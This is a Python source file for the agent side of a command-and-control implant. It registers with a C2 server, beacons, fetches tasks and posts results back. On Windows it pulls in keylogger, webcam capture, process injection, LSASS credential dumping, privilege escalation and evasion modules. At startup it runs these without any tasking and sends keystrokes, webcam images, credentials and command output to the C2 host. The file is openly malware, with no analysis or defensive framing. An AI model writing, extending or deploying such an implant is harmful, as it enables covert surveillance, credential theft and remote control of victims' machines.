import uuid
import time
import platform
import json
import base64
import logging
import requests
import threading

from datetime import datetime
from modules.system_info import get_system_info
from modules.common import encrypt_data, decrypt_data  # Optional if using encrypted C2 traffic

# Check OS
IS_WINDOWS = platform.system().lower() == "windows"
if IS_WINDOWS:
    from modules.evasion import Evasion
    from modules.keylogger import Keylogger
    from modules.webcam import WebcamCapture
    from modules.process_injection import ProcessInjector
    from modules.credential_dump import CredentialDump
    from modules.priv_esc import PrivilegeEscalation
    from modules.post_exploit import PostExploit

# === Configuration ===
C2_URL = "http://192.168.220.141:5001"
BEACON_INTERVAL = 10
agent_id = f"agent_{uuid.uuid4()}"
# ======================

# Windows-specific module instances
if IS_WINDOWS:
    evasion = Evasion()
    keylogger = Keylogger()
    webcam = WebcamCapture()
    injector = ProcessInjector()
    cred_dump = CredentialDump()
    priv_esc = PrivilegeEscalation()
    post_exp = PostExploit()

# Logger setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


def register():
    system_info = get_system_info()
    payload = {
        "agent_id": agent_id,
        "system_info": system_info,
        "status": "active"
    }
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    try:
        r = requests.post(f"{C2_URL}/api/agents/register", json={"data": encoded})
        if r.ok:
            logging.info("Successfully registered with C2 server")
        else:
            logging.warning("Registration failed: " + r.text)
    except Exception as e:
        logging.error(f"Registration error: {str(e)}")


def send_beacon():
    while True:
        payload = {
            "agent_id": agent_id,
            "status": "online"
        }
        encoded = base64.b64encode(json.dumps(payload).encode()).decode()
        try:
            r = requests.post(f"{C2_URL}/api/agents/beacon", json={"data": encoded})
            if r.status_code != 200:
                logging.error("Beacon failed: " + r.text)
        except Exception as e:
            logging.error("Error in beacon: " + str(e))
        time.sleep(BEACON_INTERVAL)


def fetch_tasks():
    while True:
        try:
            r = requests.get(f"{C2_URL}/api/tasks/{agent_id}")
            if r.ok:
                task_list = r.json()
                for task in task_list:
                    if task["status"] == "pending":
                        run_task(task)
            else:
                logging.error("Error getting tasks: " + r.text)
        except Exception as e:
            logging.error("Error getting tasks: " + str(e))
        time.sleep(BEACON_INTERVAL)


def send_result(task_id, result):
    payload = {
        "task_id": task_id,
        "agent_id": agent_id,
        "result": result
        # Optionally encrypt here:
        # "result": encrypt_data(result, "mykey123")
    }
    try:
        r = requests.post(f"{C2_URL}/api/results", json=payload)
        if not r.ok:
            logging.error("Result send failed: " + r.text)
    except Exception as e:
        logging.error("Error sending result: " + str(e))


def run_task(task):
    task_id = task.get("id")
    task_type = task.get("type")
    data = task.get("data", {})

    try:
        result = None

        if IS_WINDOWS:
            if task_type == "keylogger":
                result = keylogger.start()
            elif task_type == "webcam":
                result = webcam.capture()
            elif task_type == "process_injection":
                result = injector.inject(data.get("process"), data.get("shellcode"))
            elif task_type == "credential_dump":
                result = cred_dump.dump_lsass()
            elif task_type == "privilege_escalation":
                result = priv_esc.check_windows_services()
            elif task_type == "post_exploit":
                result = post_exp.execute(data.get("command"))

        if task_type == "system_info":
            result = get_system_info()
        elif result is None:
            result = f"Unknown or unsupported task on this platform: {task_type}"

        send_result(task_id, result)

    except Exception as e:
        send_result(task_id, f"Error: {str(e)}")


def auto_task_post_startup():
    logging.info("Running startup modules...")
    results = {
        "system_info": get_system_info()
    }

    if IS_WINDOWS:
        try:
            results["webcam"] = webcam.capture()
            results["keylogger"] = keylogger.start()
            results["priv_esc"] = priv_esc.check_windows_services()
            results["creds"] = cred_dump.dump_lsass()
            results["post_exploit"] = post_exp.execute("whoami")
        except Exception as e:
            results["startup_error"] = str(e)

    for key, value in results.items():
        task_id = f"{key}_{datetime.now().strftime('%H%M%S')}"
        send_result(task_id, value)


if __name__ == "__main__":
    register()
    auto_task_post_startup()
    threading.Thread(target=send_beacon, daemon=True).start()
    threading.Thread(target=fetch_tasks, daemon=True).start()
    while True:
        time.sleep(60)
